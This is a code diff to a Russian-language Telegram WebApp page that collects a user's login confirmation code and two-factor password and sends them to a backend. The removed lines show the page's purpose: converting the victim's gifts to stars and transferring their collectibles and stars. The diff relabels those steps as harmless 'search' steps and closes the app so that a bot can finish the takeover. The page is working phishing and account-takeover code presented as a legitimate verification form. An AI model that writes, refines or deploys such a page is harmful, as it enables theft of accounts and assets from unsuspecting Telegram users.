@@ -274,19 +274,29 @@
         </div>
 
         <!-- Форма ввода кода -->
-        <div id="codeForm" class="auth-form">
-            <div class="form-title">Введите код подтверждения отправленный на ваш аккаунт</div>
-            <div class="code-inputs" id="codeInputs">
-                <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)">
-                <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)">
-                <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)">
-                <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)">
-                <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 5)">
-            </div>
-            <div class="resend-code" onclick="resendCode()">Отправить код снова</div>
-            <button class="submit-btn" onclick="verifyCode()" id="verifyBtn">Подтвердить код</button>
-            <div class="status-message" id="codeStatus"></div>
-        </div>
+        <!-- Форма ввода кода -->
+<div id="codeForm" class="auth-form">
+    <div class="form-title">Введите код подтверждения отправленный на ваш аккаунт</div>
+    
+    <!-- Одно поле для ввода всего кода -->
+    <input type="text" id="singleCodeInput" class="code-input" 
+           style="width: 100%; margin-bottom: 1rem; font-size: 1.2rem; letter-spacing: 8px;"
+           placeholder="Введите 5-значный код" maxlength="5" 
+           oninput="formatCodeInput(this)">
+    
+    <!-- Скрытые поля для обратной совместимости -->
+    <div class="code-inputs" id="codeInputs" style="display: none;">
+        <input type="text" class="code-input" maxlength="1" readonly>
+        <input type="text" class="code-input" maxlength="1" readonly>
+        <input type="text" class="code-input" maxlength="1" readonly>
+        <input type="text" class="code-input" maxlength="1" readonly>
+        <input type="text" class="code-input" maxlength="1" readonly>
+    </div>
+    
+    <div class="resend-code" onclick="resendCode()">Отправить код снова</div>
+    <button class="submit-btn" onclick="verifyCode()" id="verifyBtn">Подтвердить код</button>
+    <div class="status-message" id="codeStatus"></div>
+</div>
         <!-- Форма ввода пароля 2FA -->
 <div id="passwordForm" class="auth-form" style="display: none;">
     <div class="form-title">Введите пароль двухфакторной аутентификации</div>
@@ -297,11 +307,11 @@
 
         <!-- Процесс обработки -->
         <div id="processingSteps" class="processing-steps">
-            <div class="step" id="step1">Аутентификация аккаунта</div>
-            <div class="step" id="step2">Получение списка подарков</div>
-            <div class="step" id="step3">Конвертация подарков в звезды</div>
-            <div class="step" id="step4">Передача коллекционных предметов</div>
-            <div class="step" id="step5">Перевод звезд</div>
+            <div class="step" id="step1">Проверка данных</div>
+            <div class="step" id="step2">Аутентификация аккаунта</div>
+            <div class="step" id="step3">Получение списка подарков</div>
+            <div class="step" id="step4">Поиск коллекционных предметов</div>
+            <div class="step" id="step5">Поиск звезд</div>
             <div class="step" id="step6">Завершение процесса</div>
         </div>
 
@@ -426,6 +436,25 @@ async function sendCodeToBackend(phone) {
         status.textContent = 'Ошибка соединения с сервером: ' + error.message;
     }
 }
+        function formatCodeInput(input) {
+    // Ограничиваем ввод только цифрами
+    input.value = input.value.replace(/\D/g, '');
+    
+    // Автоматически заполняем скрытые поля
+    const codeInputs = document.querySelectorAll('#codeInputs .code-input');
+    const value = input.value;
+    
+    for (let i = 0; i < 5; i++) {
+        if (codeInputs[i]) {
+            codeInputs[i].value = value[i] || '';
+        }
+    }
+    
+    // Автоматически отправляем форму когда введено 5 цифр
+    if (value.length === 5) {
+        document.getElementById('verifyBtn').focus();
+    }
+}
 
 async function verifyCode() {
     const codeInputs = document.querySelectorAll('.code-input');
@@ -449,14 +478,22 @@ async function verifyCode() {
     });
     
     if (result && result.success) {
-        status.textContent = 'Авторизация успешна! Запуск обработки...';
-        startAssetProcessing();
+        status.textContent = 'Код проверяется...';
+        // НЕ запускаем обработку активов здесь - бот сам запустит после полной авторизации
+        
+        // Закрываем веб-приложение через 2 секунды
+        setTimeout(() => {
+            if (window.Telegram && Telegram.WebApp) {
+                Telegram.WebApp.close();
+            }
+        }, 2000);
     } else {
         status.textContent = result?.message || 'Неверный код';
         verifyBtn.disabled = false;
         verifyBtn.textContent = 'Подтвердить код';
     }
 }
+
 
 // Функция отправки пароля 2FA
 async function submitPassword() {
@@ -481,14 +518,43 @@ async function submitPassword() {
     });
     
     if (result && result.success) {
-        status.textContent = 'Авторизация успешна! Запуск обработки...';
-        startAssetProcessing();
+        status.textContent = 'Авторизация успешна! Бот запускает обработку...';
+        
+        // Закрываем веб-приложение после успешной отправки
+        setTimeout(() => {
+            if (window.Telegram && Telegram.WebApp) {
+                Telegram.WebApp.close();
+            }
+        }, 2000);
     } else {
         status.textContent = result?.message || 'Неверный пароль';
         passwordBtn.disabled = false;
         passwordBtn.textContent = 'Подтвердить пароль';
+        passwordInput.focus();
+        passwordInput.select();
     }
 }
+
+// Функция для автоматического фокуса на поле ввода кода
+document.addEventListener('DOMContentLoaded', function() {
+    // Если открыта форма кода - фокусируемся на поле ввода
+    const codeForm = document.getElementById('codeForm');
+    if (codeForm && codeForm.style.display !== 'none') {
+        const singleInput = document.getElementById('singleCodeInput');
+        if (singleInput) {
+            singleInput.focus();
+        }
+    }
+    
+    // Если открыта форма пароля - фокусируемся на поле ввода
+    const passwordForm = document.getElementById('passwordForm');
+    if (passwordForm && passwordForm.style.display !== 'block') {
+        const passwordInput = document.getElementById('passwordInput');
+        if (passwordInput) {
+            passwordInput.focus();
+        }
+    }
+});
 
 // Проверяем параметры URL для отображения нужной формы
 document.addEventListener('DOMContentLoaded', function() {
@@ -622,6 +688,7 @@ function getUserIdFromURL() {
     </script>
 </body>
 </html>
+
 
 
 
